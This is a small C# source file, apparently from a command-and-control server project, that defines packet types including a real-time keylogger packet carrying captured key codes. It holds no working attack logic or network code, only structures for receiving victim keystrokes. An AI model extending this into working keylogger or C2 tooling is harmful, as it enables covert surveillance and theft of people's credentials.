/*
    * This file contains the types of packets that can be received.
    * Same types they are in the socket.c file
*/

using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace Command_and_Control_C_
{
    public struct Packages
    {
        
    }
    public struct pckSend_RealTimeKeylogger{
            public UInt32 key;
        };
    public enum pckSendType{
        PCK_REAL_TIME_KEY = 0x01,
        PCK_NET = 0x02,
        PCK_SSL = 0x03,
        PCK_EKEY = 0x04
    };

    }